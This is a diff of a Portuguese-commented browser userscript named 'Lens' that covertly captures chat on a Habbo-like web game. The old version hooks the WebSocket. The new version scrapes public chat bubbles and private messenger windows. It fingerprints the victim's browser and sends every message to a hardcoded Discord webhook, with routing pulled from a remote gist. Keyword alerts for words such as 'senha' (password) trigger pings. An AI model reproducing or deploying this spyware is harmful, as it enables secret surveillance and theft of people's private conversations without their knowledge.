@@ -1,3 +1,4 @@
+
 (function() {
     'use strict';
 
@@ -6,30 +7,140 @@
         delete window._lens;
     }
 
-    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
-    var DEBUG = false; // Altere para true para ver logs detalhados
-    var HEADER_INTERVAL = 60 * 1000; // intervalo em ms para inserir cabeçalho de tempo (60s)
+    // ============================================================
+    // CONFIG
+    // ============================================================
+    var DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
+    var CONFIG_URL = 'https://gist.githubusercontent.com/zBeyond5/aac262f7fa7ad61ba4bb9d47e80cfe37/raw/6cf12524bcaaa34b86484746799ad54c5a1e63e8/lens.json';
 
-    var _origWebSocket = window.WebSocket;
-    var _ws = null;
+    var ALERT_WORDS = ['sang', 'sangue', 'sangui', 'chris', 'namorado', 'senha'];
+    var ALERT_PING = '@everyone';
+    var ALLOWED_ROLES = ['1552637564597436537'];
+
+    var PRIVATE_WINDOW_SEL = '.nitro-friends-messenger';
+    var PRIVATE_PEER_SEL = '.messenger-active-chat-header .fw-bold.text-truncate';
+    var PRIVATE_MSGS_SEL = '.chat-messages';
+    var PRIVATE_MSG_SEL = '.messages-group-left, .messages-group-right';
+    var PRIVATE_SKIP_HISTORY = true;
+    var PRIVATE_PING = '<@&1552637564597436537>';
+    var PRIVATE_FIRST_SCAN_DELAY = 300;
+    // ============================================================
+
+    var DEBUG = false;
+    var MSG_TEMPLATE = '**{user}**: {msg}';
+    var HEADER_INTERVAL = 60 * 1000;
+    var CONFIG_REFRESH_MS = 5 * 60 * 1000;
+    var PUBLIC_SKIP_HISTORY = true;
+    var MIN_MSG_LEN = 1;
+    var SCAN_DEBOUNCE_MS = 80;
+
+    var SEL_PRIMARY = '.chat-content';
+    var SEL_BUBBLE = '.bubble-container';
+    var SEL_VISIBLE = 'chatbubblevisible';
+    var USER_SELECTORS = ['.username','.user','.nick','.author','[class*="username" i]','[class*="nick" i]','[class*="author" i]'];
+
     var _queue = [];
     var _isSending = false;
-    var _virtualIdMap = {};
-    var _myVirtualId = null;
-    var _accountName = '';
-    var _recentPackets = new Map();
-    var _recentOutbound = [];
     var _lastHeaderTime = 0;
+    var _seen = new Set();
+    var _observer = null;
+    var _scanScheduled = false;
     var _noop = function() {};
 
+    var _remoteConfig = null;
+    var _remoteConfigAt = 0;
+    var _sessionHash = null;
+    var _sessionLabel = '';
+    var _announcedHash = null;
+
     function _log() {
-        if (DEBUG) console.log.apply(console, ['[Lens]'].concat(Array.prototype.slice.call(arguments)));
+        if (DEBUG) console.log.apply(console, ['[Lens:' + _sessionHash + ']'].concat(Array.prototype.slice.call(arguments)));
     }
 
-    // ================= FUNÇÃO DE TIMESTAMP CORRIGIDA =================
+    // ================= SESSÃO =================
+    function _persistentSeed() {
+        var k = 'lens_seed';
+        var s = null;
+        try { s = localStorage.getItem(k); } catch(e) {}
+        if (!s) {
+            s = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+            try { localStorage.setItem(k, s); } catch(e) {}
+        }
+        return s;
+    }
+
+    function _hashStr(s) {
+        var h = 5381;
+        for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
+        return (h >>> 0).toString(36);
+    }
+
+    function _computeHash() {
+        var parts = [
+            navigator.userAgent || '',
+            navigator.language || '',
+            navigator.platform || '',
+            (screen.width + 'x' + screen.height) || '',
+            String((new Date()).getTimezoneOffset()),
+            _persistentSeed()
+        ];
+        return _hashStr(parts.join('|'));
+    }
+
+    // ================= CONFIG REMOTA =================
+    function _fetchConfig() {
+        if (!CONFIG_URL || CONFIG_URL.indexOf('http') !== 0) return Promise.resolve(_remoteConfig);
+        var sep = CONFIG_URL.indexOf('?') === -1 ? '?' : '&';
+        var url = CONFIG_URL + sep + 't=' + Date.now();
+        return fetch(url, { cache: 'no-store' })
+            .then(function(r) { return r.ok ? r.json() : null; })
+            .then(function(j) {
+                if (j && typeof j === 'object') {
+                    _remoteConfig = j;
+                    _remoteConfigAt = Date.now();
+                    _applyConfig();
+                    _log('config atualizada:', Object.keys(j).length, 'sessões');
+                }
+                return _remoteConfig;
+            })
+            .catch(function(e) { _log('config fetch falhou:', String(e)); return _remoteConfig; });
+    }
+
+    function _ensureConfigFresh() {
+        if (Date.now() - _remoteConfigAt < CONFIG_REFRESH_MS && _remoteConfig) return;
+        _fetchConfig();
+    }
+
+    function _applyConfig() {
+        if (!_remoteConfig || !_sessionHash) return;
+        var entry = _remoteConfig[_sessionHash];
+        if (entry && entry.label) {
+            var newLabel = String(entry.label);
+            if (newLabel !== _sessionLabel) {
+                _sessionLabel = newLabel;
+                _log('label atualizado:', newLabel);
+            }
+        }
+    }
+
+    function _route() {
+        if (_remoteConfig && _sessionHash && _remoteConfig[_sessionHash] && _remoteConfig[_sessionHash].webhook) {
+            return {
+                url: _remoteConfig[_sessionHash].webhook,
+                label: _remoteConfig[_sessionHash].label || '',
+                mapped: true
+            };
+        }
+        return { url: DEFAULT_WEBHOOK, label: '', mapped: false };
+    }
+
+    function _displayTag() {
+        return _sessionLabel ? (_sessionLabel + ' [' + _sessionHash + ']') : _sessionHash;
+    }
+
+    // ================= TIME =================
     function _nowBrasilia() {
         var now = new Date();
-        // Obtém a data/hora em Brasília usando fuso explícito
         var brt = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
         var dd = String(brt.getDate()).padStart(2, '0');
         var mm = String(brt.getMonth() + 1).padStart(2, '0');
@@ -40,505 +151,342 @@
         return dd + '/' + mm + '/' + yyyy + ' ' + hh + ':' + min + ':' + ss;
     }
 
-    // ================= SANITIZAÇÃO ROBUSTA DE MENSAGENS =================
-    function _cleanMessage(msg) {
-        if (!msg) return '';
-        // Remove todos os caracteres de controle (0x00-0x1F, 0x7F-0x9F) e espaços extras
-        return msg.replace(/[\x00-\x1F\x7F-\x9F]/g, '').trim();
+    function _nowHHMM() { return _nowBrasilia().substring(11, 16); }
+
+    // ================= DOM EXTRACT (público) =================
+    function _extractUserFromContent(content) {
+        for (var i = 0; i < USER_SELECTORS.length; i++) {
+            try {
+                var el = content.querySelector(USER_SELECTORS[i]);
+                if (!el) continue;
+                var t = (el.textContent || '').trim();
+                if (!t || t.length > 40) continue;
+                var full = (content.innerText || content.textContent || '').trim();
+                if (t === full) continue;
+                return t;
+            } catch (e) {}
+        }
+        var spans = content.querySelectorAll('b, strong, span');
+        for (var j = 0; j < spans.length; j++) {
+            var st = (spans[j].textContent || '').trim();
+            if (!st || st.length > 30) continue;
+            if (/[.!?]/.test(st)) continue;
+            var full2 = (content.innerText || content.textContent || '').trim();
+            if (st === full2) continue;
+            return st;
+        }
+        return null;
     }
 
-    function _fastBufferHash(buffer) {
-        var u8 = new Uint8Array(buffer);
-        var hash = 0;
-        var len = Math.min(u8.length, 64);
-        for (var i = 0; i < len; i++) { hash = ((hash << 5) - hash) + u8[i]; hash |= 0; }
-        return buffer.byteLength + '_' + hash;
+    function _cleanMsg(full, user) {
+        var msg = full;
+        if (user && msg.indexOf(user) === 0) msg = msg.slice(user.length);
+        return msg.replace(/^\s*[\s:>|·•\-–—]+/, '').trim();
     }
 
-    function _isDuplicate(data) {
-        if (!(data instanceof ArrayBuffer)) return false;
-        var key = _fastBufferHash(data);
-        var now = Date.now();
-        if (_recentPackets.has(key) && now - _recentPackets.get(key) < 80) return true;
-        _recentPackets.set(key, now);
-        if (_recentPackets.size > 120) {
-            var toDelete = [];
-            _recentPackets.forEach(function(t, k) { if (now - t > 300) toDelete.push(k); });
-            toDelete.forEach(function(k) { _recentPackets.delete(k); });
+    function _extractFromBubble(bubble) {
+        if (!bubble || bubble.nodeType !== 1) return null;
+        var content = bubble.querySelector(SEL_PRIMARY);
+        if (!content) return null;
+        var full = (content.innerText || content.textContent || '').trim();
+        if (!full) return null;
+        var user = _extractUserFromContent(content);
+        if (!user) return null;
+        var msg = _cleanMsg(full, user);
+        if (!msg || msg.length < MIN_MSG_LEN) return null;
+        return { user: user, msg: msg };
+    }
+
+    // ================= PRIVATE WINDOW =================
+    var _privateOpen = false;
+    var _privateEl = null;
+    var _privateMsgsEl = null;
+    var _privateMsgsObserver = null;
+    var _privateSeenEls = new WeakSet();
+    var _privateFirstScan = true;
+
+    function _checkPrivate() {
+        var el = null;
+        try { el = document.querySelector(PRIVATE_WINDOW_SEL); } catch(e) {}
+        if (el && !_privateOpen) _openPrivate(el);
+        else if (!el && _privateOpen) _closePrivate();
+    }
+
+    function _privatePeer(el) {
+        if (!el) return '';
+        try {
+            var n = el.querySelector(PRIVATE_PEER_SEL);
+            return n ? (n.textContent || '').trim() : '';
+        } catch(e) { return ''; }
+    }
+
+    function _openPrivate(el) {
+        _privateOpen = true;
+        _privateEl = el;
+        _privateSeenEls = new WeakSet();
+        _privateFirstScan = true;
+
+        var peer = _privatePeer(el);
+        var tag = _route().mapped ? _displayTag() : _sessionHash;
+
+        _enqueue('━━━━━━━━ 🔒 ' + PRIVATE_PING + ' ━━━━━━━━');
+        _enqueue('`' + _nowBrasilia() + '` 🔓 **janela privada ABERTA**' + (peer ? ' · **' + peer + '**' : '') + ' · ' + tag);
+
+        _watchPrivateMsgs(el);
+        _log('private open', peer);
+    }
+
+    function _closePrivate() {
+        var peer = _privatePeer(_privateEl);
+        _enqueue('`' + _nowBrasilia() + '` 🔒 **janela privada FECHADA**' + (peer ? ' · **' + peer + '**' : ''));
+        _enqueue('━━━━━━━━ 🔒 fim privado ━━━━━━━━');
+
+        _privateOpen = false;
+        _privateEl = null;
+        _privateMsgsEl = null;
+        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
+        _privateSeenEls = new WeakSet();
+        _log('private close');
+    }
+
+    function _watchPrivateMsgs(el) {
+        var msgs = null;
+        try { msgs = el.querySelector(PRIVATE_MSGS_SEL); } catch(e) {}
+        if (!msgs) { _log('private .chat-messages não achado'); return; }
+        _privateMsgsEl = msgs;
+        _privateMsgsObserver = new MutationObserver(function() { _scanPrivateMsgs(); });
+        _privateMsgsObserver.observe(msgs, { childList: true, subtree: true, characterData: true });
+        setTimeout(_scanPrivateMsgs, PRIVATE_FIRST_SCAN_DELAY);
+    }
+
+    function _scanPrivateMsgs() {
+        if (!_privateMsgsEl) return;
+        var groups;
+        try { groups = _privateMsgsEl.querySelectorAll(PRIVATE_MSG_SEL); } catch(e) { return; }
+
+        for (var i = 0; i < groups.length; i++) {
+            var g = groups[i];
+            var userEl = g.querySelector('.fw-bold');
+            var user = userEl ? (userEl.textContent || '').trim() : '';
+            var isSelf = g.classList.contains('messages-group-right');
+            var textEls = g.querySelectorAll('.text-break');
+
+            for (var j = 0; j < textEls.length; j++) {
+                var te = textEls[j];
+                if (_privateSeenEls.has(te)) continue;
+                var text = (te.textContent || '').trim();
+                if (!text) continue;
+                _privateSeenEls.add(te);
+                if (_privateFirstScan && PRIVATE_SKIP_HISTORY) continue;
+                _emitPrivateText(user, text, isSelf);
+            }
+        }
+        _privateFirstScan = false;
+    }
+
+    function _emitPrivateText(user, text, isSelf) {
+        var arrow = isSelf ? '➡️' : '⬅️';
+        var line = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' **' + user + '**: ' + text;
+        _log('private emit:', user, '→', text);
+        _enqueue(line);
+    }
+
+    // ================= SCAN (público) =================
+    function _scanBubbles(initial) {
+        _checkPrivate();
+        var bubbles;
+        try { bubbles = document.querySelectorAll(SEL_BUBBLE); } catch (e) { return; }
+
+        var emitted = 0;
+        for (var i = 0; i < bubbles.length; i++) {
+            var data = _extractFromBubble(bubbles[i]);
+            if (!data) continue;
+            var key = data.user + '\u0000' + data.msg;
+            if (_seen.has(key)) continue;
+            _seen.add(key);
+            if (initial && PUBLIC_SKIP_HISTORY) continue;
+            _emit(data.user, data.msg);
+            emitted++;
+        }
+
+        if (_seen.size > 2000) {
+            _seen.clear();
+            for (var k = 0; k < bubbles.length; k++) {
+                var d2 = _extractFromBubble(bubbles[k]);
+                if (d2) _seen.add(d2.user + '\u0000' + d2.msg);
+            }
+        }
+        if (emitted) _log('emitidos', emitted, 'novos');
+    }
+
+    function _scheduleScan() {
+        if (_scanScheduled) return;
+        _scanScheduled = true;
+        setTimeout(function() {
+            _scanScheduled = false;
+            _scanBubbles(false);
+        }, SCAN_DEBOUNCE_MS);
+    }
+
+    function _startObserver() {
+        if (_observer) return;
+        _scanBubbles(true);
+        _observer = new MutationObserver(function(muts) {
+            for (var i = 0; i < muts.length; i++) {
+                var m = muts[i];
+                if (m.type === 'childList' && m.addedNodes.length) { _scheduleScan(); return; }
+                if (m.type === 'characterData') { _scheduleScan(); return; }
+                if (m.type === 'attributes' && m.target && m.target.classList &&
+                    m.target.classList.contains(SEL_VISIBLE)) { _scheduleScan(); return; }
+            }
+        });
+        var root = document.body || document.documentElement;
+        if (root) {
+            _observer.observe(root, {
+                childList: true, subtree: true, characterData: true,
+                attributes: true, attributeFilter: ['class']
+            });
+        }
+    }
+
+    function _stopObserver() {
+        if (_observer) { _observer.disconnect(); _observer = null; }
+        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
+    }
+
+    // ================= FORMAT + SEND =================
+    function _format(user, msg) {
+        return MSG_TEMPLATE.replace('{user}', user).replace('{msg}', msg);
+    }
+
+    function _hasAlert(msg) {
+        var low = String(msg || '').toLowerCase();
+        for (var i = 0; i < ALERT_WORDS.length; i++) {
+            if (low.indexOf(ALERT_WORDS[i].toLowerCase()) !== -1) return true;
         }
         return false;
     }
 
-    function _isEcho(virtualId, text) {
-        var now = Date.now();
-        _recentOutbound = _recentOutbound.filter(function(e) { return now - e.time < 3000; });
-        var cleanText = text.replace(/[^\x20-\x7E\u00C0-\u00FF]/g, '').trim().toLowerCase();
-        for (var i = 0; i < _recentOutbound.length; i++) {
-            var outClean = _recentOutbound[i].text.replace(/[^\x20-\x7E\u00C0-\u00FF]/g, '').trim().toLowerCase();
-            if (outClean === cleanText && now - _recentOutbound[i].time < 2000) {
-                _log('Eco filtrado por texto:', cleanText);
-                return true;
-            }
-        }
-        if (_myVirtualId !== null && virtualId === _myVirtualId) {
-            _log('Eco filtrado por virtualId:', virtualId);
-            return true;
-        }
-        return false;
+    function _emit(user, msg) {
+        _ensureConfigFresh();
+        var prefix = _hasAlert(msg) ? (ALERT_PING + ' ') : '';
+        var line = prefix + '`' + _nowBrasilia() + '` ⬅️ ' + _format(user, msg);
+        _log('emit:', user, '→', msg, prefix ? '[ALERTA]' : '');
+        _enqueue(line);
     }
 
-    function _stripHTML(str) {
-        if (!str) return '';
-        return str.replace(/<[^>]*>/g, '').trim();
-    }
-
-    function _parseUnit(data) {
-        try {
-            var view = new DataView(data);
-            if (view.byteLength < 10) return;
-            var header = view.getUint16(4, false);
-            if (header !== 3111) return;
-            
-            var offset = 6;
-            var userCount = view.getUint16(offset, false);
-            offset += 2;
-            
-            _log('UNIT: ' + userCount + ' usuários');
-            
-            for (var i = 0; i < userCount && offset < view.byteLength - 4; i++) {
-                if (offset + 4 > view.byteLength) break;
-                
-                var userId = view.getUint16(offset, false);
-                offset += 2;
-                var nameLen = view.getUint16(offset, false);
-                offset += 2;
-                
-                if (nameLen > 0 && nameLen < 64 && offset + nameLen <= view.byteLength) {
-                    var nameBytes = new Uint8Array(data, offset, nameLen);
-                    var name = new TextDecoder().decode(nameBytes);
-                    offset += nameLen;
-                    var clean = _stripHTML(name);
-                    if (clean && clean.length > 1) {
-                        _virtualIdMap[userId] = clean;
-                        _log('UNIT: #' + userId + ' = "' + clean + '"');
-                        if (clean === _accountName && _accountName) {
-                            _myVirtualId = userId;
-                            _log('-> Meu virtualId:', _myVirtualId);
-                        }
-                    }
-                }
-                
-                // Skip: motto, figure, sex, etc.
-                if (offset + 2 <= view.byteLength) {
-                    var mottoLen = view.getUint16(offset, false);
-                    if (mottoLen > 0 && mottoLen < 256) offset += 2 + mottoLen;
-                    else offset += 2;
-                }
-                if (offset + 2 <= view.byteLength) {
-                    var figureLen = view.getUint16(offset, false);
-                    if (figureLen > 0 && figureLen < 256) offset += 2 + figureLen;
-                    else offset += 2;
-                }
-                if (offset + 1 <= view.byteLength) offset += 1; // sex
-            }
-        } catch(e) {
-            _log('Erro _parseUnit:', e);
-        }
-    }
-
-    function _parseItemWall(data) {
-        try {
-            var view = new DataView(data);
-            if (view.byteLength < 10) return;
-            var header = view.getUint16(4, false);
-            if (header !== 2739) return;
-            
-            var offset = 6;
-            var count = view.getUint16(offset, false);
-            offset += 2;
-            
-            _log('ITEM_WALL: ' + count + ' usuários');
-            
-            for (var i = 0; i < count && offset < view.byteLength - 4; i++) {
-                if (offset + 4 > view.byteLength) break;
-                
-                var userId = view.getUint16(offset, false);
-                offset += 2;
-                var nameLen = view.getUint16(offset, false);
-                offset += 2;
-                
-                if (nameLen > 0 && nameLen < 64 && offset + nameLen <= view.byteLength) {
-                    var nameBytes = new Uint8Array(data, offset, nameLen);
-                    var name = new TextDecoder().decode(nameBytes);
-                    offset += nameLen;
-                    var clean = _stripHTML(name);
-                    if (clean && clean.length > 1) {
-                        if (!_virtualIdMap[userId]) {
-                            _virtualIdMap[userId] = clean;
-                            _log('ITEM_WALL: #' + userId + ' = "' + clean + '"');
-                        }
-                        if (clean === _accountName && _accountName) {
-                            _myVirtualId = userId;
-                            _log('-> Meu virtualId:', _myVirtualId);
-                        }
-                    }
-                }
-            }
-        } catch(e) {
-            _log('Erro _parseItemWall:', e);
-        }
-    }
-
-    function _parseChangeName(data) {
-        try {
-            var view = new DataView(data);
-            if (view.byteLength < 16) return;
-            var header = view.getUint16(4, false);
-            if (header !== 2447) return;
-            
-            var offsetsToTry = [
-                [12, 14, 16],  // offset mais comum
-                [8, 10, 12],   // alternativa
-                [10, 12, 14],  // outra alternativa
-            ];
-            
-            for (var o = 0; o < offsetsToTry.length; o++) {
-                var virtualIdOffset = offsetsToTry[o][0];
-                var nameLenOffset = offsetsToTry[o][1];
-                var nameOffset = offsetsToTry[o][2];
-                
-                if (view.byteLength < nameOffset + 2) continue;
-                
-                var virtualId = view.getUint16(virtualIdOffset, false);
-                var nameLen = view.getUint16(nameLenOffset, false);
-                
-                if (nameLen > 0 && nameLen < 128 && nameOffset + nameLen <= view.byteLength) {
-                    var nameBytes = new Uint8Array(data, nameOffset, nameLen);
-                    var name = new TextDecoder().decode(nameBytes);
-                    var clean = _stripHTML(name);
-                    if (clean && clean.length > 1) {
-                        _virtualIdMap[virtualId] = clean;
-                        _log('CHANGE_NAME: #' + virtualId + ' = "' + clean + '" (offset ' + o + ')');
-                        if (clean === _accountName && _accountName) {
-                            _myVirtualId = virtualId;
-                            _log('-> Meu virtualId:', _myVirtualId);
-                        }
-                        return;
-                    }
-                }
-            }
-        } catch(e) {
-            _log('Erro _parseChangeName:', e);
-        }
-    }
-
-    function _parseUserInfo(data) {
-        try {
-            var view = new DataView(data);
-            if (view.byteLength < 10) return;
-            var header = view.getUint16(4, false);
-            if (header !== 2583) return;
-            
-            var userId = view.getUint16(6, false);
-            var nameLen = view.getUint16(8, false);
-            
-            if (nameLen > 0 && nameLen < 32 && 10 + nameLen <= view.byteLength) {
-                var nameBytes = new Uint8Array(data, 10, nameLen);
-                var name = new TextDecoder().decode(nameBytes).trim();
-                if (name && name.length > 1) {
-                    _accountName = name;
-                    _log('USER_INFO: accountName = "' + _accountName + '"');
-                    
-                    for (var vid in _virtualIdMap) {
-                        if (_virtualIdMap[vid] === _accountName) {
-                            _myVirtualId = parseInt(vid);
-                            _log('-> Meu virtualId:', _myVirtualId);
-                            break;
-                        }
-                    }
-                }
-            }
-        } catch(e) {
-            _log('Erro _parseUserInfo:', e);
-        }
-    }
-
-    // ================= CABEÇALHO PERIÓDICO =================
-    function _checkAndInsertHeader() {
+    function _checkHeader() {
         var now = Date.now();
         if (now - _lastHeaderTime >= HEADER_INTERVAL) {
-            var fullTime = _nowBrasilia();
-            var hhmm = fullTime.substring(11, 16); // extrai HH:MM
-            var header = '----------------Mensagens: ' + hhmm + '-------------------';
-            _queue.push(header);
+            var r = _route();
+            var tag = r.mapped ? _displayTag() : ('novo · ' + _sessionHash + ' · mapeie no gist');
+            _queue.push('━━━━━━━ 🕐 ' + _nowHHMM() + ' · ' + tag + ' ━━━━━━━');
             _lastHeaderTime = now;
         }
     }
 
-    function _sendToDiscord(message) {
-        if (!message || message.length < 5) return;
-        _checkAndInsertHeader(); // <-- insere separador se necessário
-        _queue.push(message);
-        if (!_isSending) _processQueue();
-    }
-
-    function _processQueue() {
-        if (_isSending || _queue.length === 0) return;
-        _isSending = true;
-        var batch = _queue.splice(0, 5);
-        var content = batch.join('\n');
-        
-        if (content.length > 1950) {
-            content = content.substring(0, 1950) + '...';
-        }
-        
-        fetch(WEBHOOK_URL, {
+    function _announceIfNew() {
+        if (_route().mapped) return;
+        if (_announcedHash === _sessionHash) return;
+        _announcedHash = _sessionHash;
+        var line = '🟢 **nova sessão** `' + _sessionHash + '`\n' +
+                   'UA: `' + (navigator.userAgent || '').slice(0, 90) + '`\n' +
+                   'adicione no gist: `"' + _sessionHash + '": { "webhook": "...", "label": "..." }`';
+        fetch(DEFAULT_WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: content })
+            body: JSON.stringify({ content: line, username: 'Lens · ' + _sessionHash })
+        }).catch(_noop);
+    }
+
+    function _enqueue(line) {
+        if (!line || line.length < 5) return;
+        _checkHeader();
+        _queue.push(line);
+        if (!_isSending) _flush();
+    }
+
+    function _flush() {
+        if (_isSending || _queue.length === 0) return;
+        _isSending = true;
+
+        var target = _route().url;
+        var batch = _queue.splice(0, 5);
+        var content = batch.join('\n');
+        if (content.length > 1950) content = content.substring(0, 1950) + '...';
+
+        fetch(target, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: content,
+                username: 'Lens · ' + _displayTag(),
+                allowed_mentions: { parse: ['everyone'], roles: ALLOWED_ROLES }
+            })
         }).catch(_noop).finally(function() {
             _isSending = false;
-            setTimeout(_processQueue, 400);
+            setTimeout(_flush, 400);
         });
     }
 
-    // ================= PROCESSAMENTO DE MENSAGENS (COM _cleanMessage) =================
-    function _parseInboundChat(data) {
-        try {
-            var view = new DataView(data);
-            if (view.byteLength < 10) return null;
-            
-            var header = view.getUint16(4, false);
-            if (header !== 1146 && header !== 25 && header !== 890) return null;
-            
-            _log('Chat INBOUND header=' + header + ', length=' + view.byteLength);
-            
-            var offset = 6;
-            var targetId = null;
-            
-            if (header === 890) {
-                if (offset + 2 > view.byteLength) return null;
-                targetId = view.getUint16(offset, false);
-                offset += 2;
-                _log('  targetId=' + targetId);
-            }
-            
-            if (offset + 2 > view.byteLength) return null;
-            var virtualId = view.getUint16(offset, false);
-            offset += 2;
-            
-            if (offset + 2 > view.byteLength) return null;
-            var msgLen = view.getUint16(offset, false);
-            offset += 2;
-            
-            _log('  virtualId=' + virtualId + ', msgLen=' + msgLen + ', offset=' + offset);
-            
-            if (msgLen === 0 || msgLen > 4096) return null;
-            if (offset + msgLen > view.byteLength) {
-                _log('  Truncado! Esperado ' + msgLen + ', disponível ' + (view.byteLength - offset));
-                msgLen = view.byteLength - offset;
-                if (msgLen <= 0) return null;
-            }
-            
-            var msgBytes = new Uint8Array(data, offset, msgLen);
-            var msg = new TextDecoder().decode(msgBytes);
-            msg = _cleanMessage(msg); // sanitização robusta
-            
-            _log('  msg="' + msg + '"');
-            
-            if (!msg) return null;
-            
-            if (_isEcho(virtualId, msg)) {
-                _log('  -> ECO filtrado');
-                return null;
-            }
-            
-            var userName = _virtualIdMap[virtualId] || ('User#' + virtualId);
-            var time = _nowBrasilia();
-            
-            if (header === 890) {
-                var targetName = targetId !== null ? (_virtualIdMap[targetId] || ('User#' + targetId)) : 'alguém';
-                return '`' + time + '` ⬅️ **' + userName + '** ❤️ **' + targetName + '**: ' + msg;
-            }
-            var label = header === 25 ? '📢 ' : '';
-            return '`' + time + '` ⬅️ **' + label + userName + '**: ' + msg;
-            
-        } catch(e) {
-            _log('Erro _parseInboundChat:', e);
-            return null;
-        }
-    }
-
-    function _parseOutboundChat(data) {
-        try {
-            var view = new DataView(data);
-            if (view.byteLength < 8) return null;
-            
-            var header = view.getUint16(4, false);
-            if (header !== 1678) return null;
-            
-            _log('Chat OUTBOUND length=' + view.byteLength);
-            
-            var msgLen = view.getUint16(6, false);
-            
-            _log('  msgLen=' + msgLen);
-            
-            if (msgLen === 0 || msgLen > 4096 || 8 + msgLen > view.byteLength) return null;
-            
-            var msgBytes = new Uint8Array(data, 8, msgLen);
-            var msg = new TextDecoder().decode(msgBytes);
-            msg = _cleanMessage(msg); // sanitização robusta
-            
-            _log('  msg="' + msg + '"');
-            
-            if (!msg) return null;
-            
-            _recentOutbound.push({ text: msg, time: Date.now() });
-            
-            var now = Date.now();
-            _recentOutbound = _recentOutbound.filter(function(e) { return now - e.time < 3000; });
-            
-            var time = _nowBrasilia();
-            return '`' + time + '` ➡️ **Você**: ' + msg;
-            
-        } catch(e) {
-            _log('Erro _parseOutboundChat:', e);
-            return null;
-        }
-    }
-
-    function _processInbound(data) {
-        if (!(data instanceof ArrayBuffer)) return;
-        if (_isDuplicate(data)) return;
-        if (data.byteLength < 6) return;
-        
-        var header = new DataView(data).getUint16(4, false);
-        _log('Inbound header:', header, 'length:', data.byteLength);
-        
-        if (header === 3111) _parseUnit(data);
-        if (header === 2739) _parseItemWall(data);
-        if (header === 2447) _parseChangeName(data);
-        if (header === 2583) _parseUserInfo(data);
-        
-        var msg = _parseInboundChat(data);
-        if (msg) _sendToDiscord(msg);
-    }
-
-    function _processOutbound(data) {
-        if (!(data instanceof ArrayBuffer)) return;
-        if (data.byteLength < 6) return;
-        
-        var header = new DataView(data).getUint16(4, false);
-        _log('Outbound header:', header, 'length:', data.byteLength);
-        
-        var msg = _parseOutboundChat(data);
-        if (msg) _sendToDiscord(msg);
-    }
-
-    function hookWebSocket() {
-        if (window._wsHooked) return;
-        window._wsHooked = true;
-
-        window.WebSocket = function() {
-            var args = Array.prototype.slice.call(arguments);
-            var ws = new (_origWebSocket.bind.apply(_origWebSocket, [null].concat(args)))();
-            if (!_ws) {
-                _ws = ws;
-                _log('WebSocket capturado');
-            }
-
-            var origSend = ws.send;
-            ws.send = function(data) {
-                try { 
-                    if (data instanceof ArrayBuffer) {
-                        _processOutbound(data);
-                    } else if (data instanceof Uint8Array) {
-                        _processOutbound(data.buffer);
-                    }
-                } catch(e) {
-                    _log('Erro send:', e);
-                }
-                return origSend.call(ws, data);
-            };
-
-            var origAE = ws.addEventListener;
-            ws.addEventListener = function(type, listener, options) {
-                if (type === 'message' && !listener._lensHooked) {
-                    var self = ws;
-                    var wrapped = function(event) {
-                        var data = event.data;
-                        if (data instanceof Blob) {
-                            data.arrayBuffer().then(function(buf) {
-                                _processInbound(buf);
-                                try { listener.call(self, new MessageEvent('message', { data: buf, origin: event.origin })); } catch(e) {}
-                            });
-                            return;
-                        }
-                        if (data instanceof ArrayBuffer) {
-                            _processInbound(data);
-                        } else if (data instanceof Uint8Array) {
-                            _processInbound(data.buffer);
-                        }
-                        try { listener.call(self, event); } catch(e) {}
-                    };
-                    wrapped._lensHooked = true;
-                    return origAE.call(ws, type, wrapped, options);
-                }
-                return origAE.call(ws, type, listener, options);
-            };
-
-            return ws;
-        };
-        
-        window.WebSocket.prototype = _origWebSocket.prototype;
-        if (_origWebSocket.CONNECTING !== undefined) window.WebSocket.CONNECTING = _origWebSocket.CONNECTING;
-        if (_origWebSocket.OPEN !== undefined) window.WebSocket.OPEN = _origWebSocket.OPEN;
-        if (_origWebSocket.CLOSING !== undefined) window.WebSocket.CLOSING = _origWebSocket.CLOSING;
-        if (_origWebSocket.CLOSED !== undefined) window.WebSocket.CLOSED = _origWebSocket.CLOSED;
-    }
-
-    function tryCaptureExisting() {
-        var attempts = 0;
-        var iv = setInterval(function() {
-            if (_ws) { clearInterval(iv); return; }
-            var refs = ['ws', 'socket', 'gameSocket', 'connection', 'wsConnection', '_ws'];
-            for (var i = 0; i < refs.length; i++) {
-                var candidate = window[refs[i]];
-                if (candidate && candidate instanceof _origWebSocket && candidate.readyState === 1) {
-                    _ws = candidate;
-                    _log('WebSocket existente capturado:', refs[i]);
-                    clearInterval(iv);
-                    return;
-                }
-            }
-            if (++attempts > 100) clearInterval(iv);
-        }, 100);
-    }
-
+    // ================= INIT / KILL =================
     function init() {
-        _log('Inicializando...');
-        hookWebSocket();
-        tryCaptureExisting();
+        _sessionHash = _computeHash();
+        _log('inicializando. hash=' + _sessionHash);
+        console.log('%c[Lens]','color:#22d3ee;font-weight:bold','sessão ' + _sessionHash + ' · window._lens.stats()');
+
+        _fetchConfig().then(function() {
+            _applyConfig();
+            _announceIfNew();
+        });
+        setInterval(_fetchConfig, CONFIG_REFRESH_MS);
+
+        _startObserver();
     }
 
     function kill() {
-        _log('Desligando...');
+        _log('desligando...');
         _queue.length = 0;
-        _recentPackets.clear();
-        _recentOutbound = [];
-        _virtualIdMap = {};
-        _myVirtualId = null;
-        _accountName = '';
-        _lastHeaderTime = 0;
-        window.WebSocket = _origWebSocket;
-        window._wsHooked = false;
-        _ws = null;
+        _seen.clear();
+        _stopObserver();
+        _privateOpen = false;
+        _privateEl = null;
+        _privateMsgsEl = null;
+        _privateSeenEls = new WeakSet();
         delete window._lens;
     }
 
-    // Exposição furtiva (não-enumerável)
